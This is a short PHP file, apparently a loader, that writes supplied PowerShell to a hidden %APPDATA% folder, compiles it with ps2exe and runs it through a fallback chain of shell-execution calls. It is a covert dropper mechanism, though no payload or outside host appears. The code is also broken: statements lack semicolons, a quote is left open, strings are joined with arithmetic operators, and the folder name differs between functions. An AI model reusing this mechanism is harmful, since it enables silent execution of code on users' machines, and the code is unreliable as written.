<?php

function writeScript($data)
{
    $path = env('APPDATA');
    cmd("mkdir '$path\\TestShell");
    $path+="\\TestShell\\test.ps1";
    file_put_contents($path, $data);
    return $path
}


function cmd($command)
{
    try
    {
        return shell_exec($command);
    }
    catch(exception $e)
    {
        try
        {
            $output=null;
            exec($command, $output);
            $out = '';
            foreach ($output as $i)
            {
                $out = "$out\n$i";
            }
            return $out;
        }
        catch(exception $e)
        {
            pclose(popen("start /B $command > outphp.txt", "r"));
            return file_get_contents('outphp.txt');
        }

    }
}


function start($script)
{
    if (file_exists(env('APPDATA')+'\\TeastShell\\test.ps1')==FALSE)
    {
        $path = writeScript($script)
        cmd("ps2exe $path test.exe")
        cmd(env('APPDATA')+'\\TeastShell\\test.exe')
    }
}

?>
